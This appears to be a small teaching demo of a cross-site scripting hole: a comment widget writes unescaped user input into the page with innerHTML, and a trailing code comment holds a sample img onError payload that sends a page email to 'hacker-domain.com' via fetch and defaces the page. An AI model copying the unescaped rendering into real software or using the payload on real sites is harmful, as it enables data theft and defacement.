const commentEl = document.getElementById('comment');
const postBtn = document.getElementById('post');
const commentsContainer = document.getElementById('comments');

const comments = [];

function render() {
    let html = '';
    comments.forEach(comment => {
        html = html + `<div class="comment">${comment}</div>`;
    });
    console.log(html)
    commentsContainer.innerHTML = html;
}

postBtn.addEventListener('click', () => {
    const text = commentEl.value;
    comments.push(text);
    render();
    commentEl.value = '';
});













/*
<img src=x onError="
const email = document.querySelector('#email').innerText
console.log(email)
fetch('https://hacker-domain.com?hackedEmail=' + email)
document.body.style.backgroundColor = 'black';
document.body.innerHTML='YOU JUST GOT HACKED'
"/>
 */

